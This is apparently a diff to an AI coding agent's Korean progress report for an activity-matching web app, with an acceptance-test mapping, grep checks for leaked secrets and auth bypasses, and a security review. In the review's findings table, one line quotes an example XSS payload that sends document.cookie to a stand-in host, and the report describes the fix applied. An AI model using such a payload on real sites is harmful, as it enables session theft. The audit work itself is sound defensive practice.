@@ -103,6 +103,94 @@
 3. **pg_cron 경합 자체도 이론상 가능해** `tests/global-setup.ts`를 추가했다 — 테스트 스위트 시작 전 `cron.unschedule`로 `match-worker` 작업을 내리고, 스위트가 끝나면 마이그레이션과 동일한 정의로 복원한다(로컬 Postgres 포트에 `pg`로 직접 연결 — 테스트 전용 제어 함수를 프로덕션 스키마에 남기지 않기 위해 순수 테스트 하네스 안에서 처리). 위 1·2번을 고치기 전에는 이것만으로 흔들림이 사라지지 않았지만(진짜 원인이 아니었으므로), 세 가지를 모두 적용한 뒤에는 흔들리지 않는다.
 - **검증:** 위 세 가지를 모두 적용한 뒤 `npm test`를 **연속 10회**(`tests/rls`만 5회 + 전체 스위트 5회) 실행해 전부 125/125(또는 66/66) 통과 확인. `lint`/`typecheck`/`build` 모두 성공.
 
+## 5-B단계: 인수 조건 점검 (지시서 13장, 17개 시나리오)
+
+지시서 13장의 표를 실제 테스트 파일·테스트 이름에 연결한다. "약함"으로 표시했던 4개
+항목(권한 위조, 채팅 접근 공격, 운영자 CSV, 환경 분리)은 이번에 테스트를 추가해 보강했다.
+
+| # | 시나리오 | 기대 결과 | 검증 방법 | 상태 |
+|---|---|---|---|---|
+| 1 | 온보딩·수정 | 새로고침 후 유지되고 추천 근거가 변경됨 | E2E `auth-onboarding.spec.ts`(새로고침 후 유지 확인) + 단위 `recommend.test.ts`(입력이 바뀌면 점수·근거가 다시 계산됨, 10건) | ⚠️ **부분**: "프로필 수정 → 실제 화면에 다른 추천 근거가 표시됨"을 잇는 전용 E2E는 없다. `loadRecommendationForActivity`가 캐시 없이 매 렌더링마다 현재 `profile_interests`를 다시 읽어 순수 함수에 넣는 구조라 배선 위험은 낮다고 판단했지만, 실제 화면으로 눈으로 확인한 적은 없다 — 시간 제약으로 추가하지 못함(재현 명령: student1로 로그인 → `/me/edit`에서 관심분야를 "환경"으로 바꿈 → `관심분야 태그가 '환경'인 활동` 상세에서 "관심분야 '환경' 일치" 배지 확인) |
+| 2 | 활동 검색·필터 | 필터 조합·페이지 이동·URL 복원이 작동함 | E2E `activities-filter.spec.ts` | ✅ |
+| 3 | 마감 활동 | 기본 추천에서 제외되고 원문 상세는 확인 가능 | 쿼리 레벨(`recommendations/query.ts`·`page.tsx`가 `status='published'`만 조회) + RLS `anon.test.ts`("draft/closed 활동은 비회원에게 보이지 않는다") | ⚠️ **부분**: 제외 자체는 한 줄 쿼리 필터로 구조적으로 보장되지만, "추천 목록에서 마감 활동이 실제로 빠진다"는 것을 직접 단언하는 테스트는 없다 |
+| 4 | 추천 미상 정보 | 없는 자격·일정·전공 근거를 만들어내지 않음 | 단위 `recommend.test.ts`("비교 불가 항목은 제외하고 정규화", "미입력 일정을 맞는다고 표시하지 않음") | ✅ |
+| 5 | 파티 마지막 자리 동시 승인 | 정원 초과 없이 한 명만 확정됨 | RLS `party_lifecycle.test.ts`("같은 역할의 마지막 슬롯에 동시 승인 2건이 들어와도 1명만 성공한다") | ✅ |
+| 6 | 동일 활동의 두 파티 동시 가입 | 하나만 확정되고 나머지는 정리됨 | RLS `party_lifecycle.test.ts`("같은 활동 두 파티의 동시 승인 시 한 곳만 성공하고 나머지 지원은 superseded 처리된다") | ✅ |
+| 7 | 빠른 매칭 성공 | 역할·전체 공통 시간 충족, 전원 수락 후 팀/채팅방 한 번 생성 | RLS `matching.test.ts`("매칭 성공 → 전원 수락 → 파티와 채팅방이 정확히 1개만 생성된다") + `matching_consistency.test.ts`(TS/plpgsql 일치) + E2E `match-flow.spec.ts` | ✅ |
+| 8 | 겹침의 함정 | 두 사람씩만 시간이 맞고 전체 교집합이 없으면 팀 미생성 | 단위 `matching.test.ts`(TS) + RLS `matching_consistency.test.ts` + `matching_scenarios.test.ts`(plpgsql 워커) — 3중 검증 | ✅ |
+| 9 | 거절·기한 초과 | 제안 해제, 사전 동의한 사용자만 재대기 | RLS `matching.test.ts`("한 명이 거절하면 제안이 해제되고...", "수락 기한이 지나면 만료 처리되고...") | ✅ |
+| 10 | 워커 중복 실행·재시도 | 중복 제안·팀·알림이 생기지 않음 | RLS `matching.test.ts`("워커를 동시에 두 번 실행해도 같은 그룹에 중복 제안이 생기지 않는다", "마지막 두 명이 동시에 수락해도 파티는 1개만 생긴다") + `chat.test.ts`("같은 client_message_id로 재전송해도 1건만 저장된다") | ✅ |
+| 11 | 두 독립 세션 채팅 | 실시간 수신, 새로고침 복구, 실패 재시도 시 중복 없음 | E2E `chat-flow.spec.ts`(독립 브라우저 컨텍스트 2개) | ✅ |
+| 12 | 채팅 접근 공격 | 다른 팀의 조회·전송·구독 요청이 서버/DB에서 거부됨 | RLS `chat.test.ts`(조회·전송, 직접 테이블 INSERT 우회 포함) + `cross_user.test.ts`(조회) + **신규** E2E `outsider-chat-access.spec.ts`(구독 — 페이지 접근 자체 차단) + E2E `chat-flow.spec.ts`(이미 열려 있던 연결이 탈퇴 후 구독 끊김) | ✅ (이번에 구독 경로 보강) |
+| 13 | 탈퇴·강퇴 | 기존 열린 연결을 포함해 이후 채팅 접근이 차단됨 | RLS `chat.test.ts`("탈퇴 직후에는 조회·전송이 모두 거부된다") + E2E `chat-flow.spec.ts`(이미 열린 연결이 탈퇴 후 메시지 미수신) | ✅ |
+| 14 | 차단 사용자 | 새로운 자동 매칭에서 제외됨 | 단위 `matching.test.ts`(TS, "차단된 사용자끼리는 같은 팀으로 묶지 않음") + RLS `matching_consistency.test.ts`·`matching_scenarios.test.ts`(plpgsql 워커) + `blocking.test.ts`(파티 지원 거부, 알림 억제) | ✅ |
+| 15 | 권한 위조 | 일반 사용자가 관리자 역할·타인 프로필·활동을 수정할 수 없음 | RLS `admin_write.test.ts`(활동 등록 **및 수정** 거부 — **신규**, `user_roles` 자가 승격 거부) + `cross_user.test.ts`(타인 프로필 수정 거부) + E2E `admin-access.spec.ts`(관리자 화면 접근 거부) | ✅ (이번에 "활동 수정" 거부 테스트 보강) |
+| 16 | 운영자 CSV | 잘못된 행·중복을 확인하고 안전하게 등록 가능 | 단위 `activities-csv.test.ts`(파싱·검증·중복 탐지 15건) + **신규** RLS `admin_write.test.ts`(운영자는 CSV와 같은 모양으로 일괄 등록 가능/비공개 생성, 일반 사용자는 거부) | ✅ (이번에 실제 DB 쓰기 양성/음성 테스트 보강) |
+| 17 | 환경 분리 | 운영 환경에 데모 시드·개발 인증 우회·비밀 키 노출이 없음 | 수동 실행 + grep 확인(아래 "실제 실행한 검증과 결과" 표에 명령과 결과 기록) — 자동화된 단위/통합 테스트가 아니라 빌드 산출물·소스 검사다 | ✅ (이번에 실제로 실행해 확인) |
+
+**요약:** 17개 중 15개 ✅, 2개(1·3번) ⚠️ 부분 — 둘 다 "기능은 구조적으로 보장되지만 그 사실을
+직접 단언하는 전용 테스트가 없다"는 같은 종류의 격차이며, 시간 제약으로 이번에 추가하지
+못했다. 완료로 보고하지 않고 재현 명령과 함께 남겨둔다.
+
+### 17번(환경 분리) 실제 실행한 명령과 결과
+
+| 명령 | 결과 |
+|---|---|
+| `grep -rniE "bypass\|skip.?auth\|dev.?only.?login\|NODE_ENV\s*===\s*.development.\|backdoor\|debug.?login\|fake.?(user\|auth\|login)" src/` | 일치 없음 — 개발용 인증 우회 코드 없음 |
+| `grep -rln "seed.sql" src/ next.config.ts package.json` | 일치 없음 — `seed.sql`은 Supabase CLI(`db reset`/`db seed`)로만 적용되고 앱 런타임 코드 어디에서도 참조하지 않음 |
+| `grep -rl "<로컬 SERVICE_ROLE_KEY 값>" .next/static` (`npm run build` 산출물) | 일치 없음 — 클라이언트 번들(`static/`)에 service-role 키가 없음 |
+| `grep -rl "<로컬 SERVICE_ROLE_KEY 값>" .next` (전체) | `.next/cache/turbopack/*.sst`(빌드러 내부 캐시, 빌드 머신에만 존재하고 브라우저에 서빙되지 않음)에서만 발견 — 클라이언트에 도달하는 경로 없음 |
+| `grep -rl "SERVICE_ROLE\|service_role" .next/static` | 일치 없음 |
+
+## 5-B단계: 보안 리뷰
+
+**구현에 참여하지 않은 별도 reviewer 에이전트에게 맡기려 했으나 실패했다.** `general-purpose`
+서브에이전트를 보안 리뷰 전담으로 띄웠는데, 18분 동안 세 번 상태를 확인(SendMessage)했지만
+한 번도 응답하지 않았다("idle" 상태로만 남음 — 실행이 안 됐는지, 끝내고 결과가 유실됐는지
+확인할 방법이 없었다). 무한정 기다리는 대신 **직접 리뷰를 수행했다** — 요청한 "구현에 참여하지
+않은 독립된 시선"이라는 조건은 충족하지 못했다는 점을 분명히 남긴다. Claude Code에 이 서브에이전트
+무응답 현상을 버그로 보고해 뒀다(세션 피드백).
+
+### 점검 범위와 방법
+
+- **RLS 정책 전체**(`supabase/migrations/*.sql` 전부): 모든 사용자 데이터 테이블에 RLS가
+  켜져 있고 정책이 있는지, 소유자/운영자 범위가 맞는지 직접 읽으며 확인.
+- **SECURITY DEFINER 함수 61개**: `search_path` 고정 여부를 스크립트로 전수 검사, EXECUTE
+  권한 부여 패턴을 grep으로 확인.
+- **서버 액션 입력 검증**: `zod` 사용 여부 확인, DB 함수 쪽 검증으로 실질적으로 충분한지 평가.
+- **XSS**: `dangerouslySetInnerHTML` 사용 여부, 사용자 입력이 `href` 등 속성값으로 렌더링되는
+  모든 지점 확인.
+- **오픈 리다이렉트**: `src/lib/url.ts`/`src/app/auth/confirm/route.ts` 재확인(기존 단위
+  테스트 13건이 이미 검증 중).
+- **빈도 제한**: 로그인/OTP(Supabase 내장 `auth.rate_limit`), 파티/채팅/신고/제보(앱 레벨
+  `app_settings`) 전체 확인.
+
+### 발견 사항
+
+| 심각도 | 위치 | 문제 | 공격 시나리오 | 조치 |
+|---|---|---|---|---|
+| **높음** | `activities.source_url` → `src/app/activities/[id]/page.tsx`, `src/app/admin/submissions/SubmissionRow.tsx` | 사용자가 직접 입력한 `source_url`을 `<a href={...}>`로 그대로 렌더링. React는 텍스트는 이스케이프하지만 속성값(href)은 스킴을 검사하지 않는다 | 일반 사용자가 `/activities/submit`으로 `source_url = "javascript:fetch('https://evil.example/steal?c='+document.cookie)"`인 활동을 제보 → **운영자가 `/admin/submissions`에서 검토하며 "원문 링크" 버튼을 클릭하는 순간**(승인 여부와 무관하게) 운영자 세션에서 스크립트 실행 → 운영자 쿠키·세션 탈취 가능. 승인되면 활동을 보는 모든 사용자에게도 같은 위험이 퍼짐 | **수정함** — ① `src/lib/url.ts`에 `isHttpUrl()` 추가, 두 렌더링 지점 모두 `isHttpUrl(url)`일 때만 링크로 렌더링(마이그레이션 없이 바로 적용). ② `submit_activity()` DB 함수도 저장 시점에 `http(s)://`가 아니면 `INVALID_SOURCE_URL`로 거부(마이그레이션 `20261004050000`, 여러 겹 방어). 단위 테스트 4건 + RLS 테스트 1건 추가, 전부 통과 |
+| 정보 | `is_party_member(uuid)` | `anon`에게도 EXECUTE가 부여돼 있음(다른 모든 내부 헬퍼는 `authenticated`만) | 비로그인 사용자가 임의 `party_id`로 직접 호출 가능하지만, 내부적으로 `auth.uid()`(null)를 기준으로 판정하므로 항상 `false`를 반환 — 정보 유출 없음. RLS 정책(`chat_rooms_select` 등)이 비로그인 조회를 함께 평가하려면 이 grant가 필요해 보여 의도된 것으로 판단 | 조치 안 함(실제 위험 없음, 의도된 설계로 판단) |
+| 정보 | 서버 액션 입력 검증에 `zod`가 전혀 쓰이지 않음(`package.json`엔 의존성으로 있음) | 타입스크립트 타입은 런타임에 사라지므로 서버 액션 자체는 "느슨하게 타입된 입력"을 받는다 | 조작된 요청으로 잘못된 모양의 입력을 보내도, 코드베이스 전체가 일관되게 "쓰기는 반드시 SECURITY DEFINER 함수를 거치고 그 함수가 다시 검증한다" 패턴을 쓰고 있어(이번 리뷰로 61개 함수 전수 확인) 실제 악용 사례를 찾지 못했다. 다만 이 패턴이 지켜지지 않는 직접 테이블 쓰기(bookmarks, blocks)는 애초에 자유 텍스트 필드가 없어 위험이 낮다 | 조치 안 함(이번 리뷰에서는 실제 악용 경로를 찾지 못함) — 다음에 자유 텍스트 입력을 받는 새 서버 액션을 추가할 때는 DB 함수 검증과 별개로 zod 스키마를 먼저 쓰는 습관을 들이도록 권고 |
+
+### 확인했고 문제 없었던 것 ("Checked, no issues found")
+
+- SECURITY DEFINER 함수 61개 전수 스캔 — `search_path` 누락 0건.
+- `_`로 시작하는 내부 헬퍼 함수는 `authenticated`/`anon`에 EXECUTE가 부여된 사례 0건(의도대로
+  오너 컨텍스트에서만 호출됨).
+- `execute format(...)` 동적 SQL 사용처를 모두 확인 — 사용자 입력을 직접 문자열 결합하는 곳
+  없음(테이블/함수 이름처럼 코드 내부에서 고정된 식별자에만 `format('%I', ...)` 사용).
+  SQL 인젝션 경로 없음.
+- `dangerouslySetInnerHTML` 사용 0건.
+- 오픈 리다이렉트: `src/lib/url.ts`가 Host 헤더를 신뢰하지 않고 허용 목록 기반으로만 origin을
+  고르며, `next` 파라미터도 인코딩 우회까지 거부(기존 단위 테스트 13건으로 검증됨, 재확인 완료).
+- CSRF: `next.config.ts`에 서버 액션의 기본 Origin 검사를 느슨하게 하는 설정(`serverActions.allowedOrigins`
+  재정의 등) 없음 — Next.js 기본 보호 그대로 적용됨.
+- 로그인/OTP 빈도 제한: Supabase 내장 `auth.rate_limit`(5분당 로그인 시도 30회, 검증 30회)으로
+  보호됨. 파티 생성/지원, 채팅 메시지, 신고, 활동 제보는 모두 `app_settings`의 앱 레벨 빈도
+  제한이 있음(각 마이그레이션에서 확인).
+- 비밀값 노출: 위 "환경 분리" 절의 grep 결과 참조 — 클라이언트 번들에 service-role 키 없음.
+
 ## 2-B 산출물
 
 - **인증:** `/login`(이메일 매직링크, 비밀번호 없음) → `/auth/confirm`(token_hash 교환, 서버 세션 쿠키) → 온보딩 완료 여부로 분기. 개발용 인증 우회 없음.
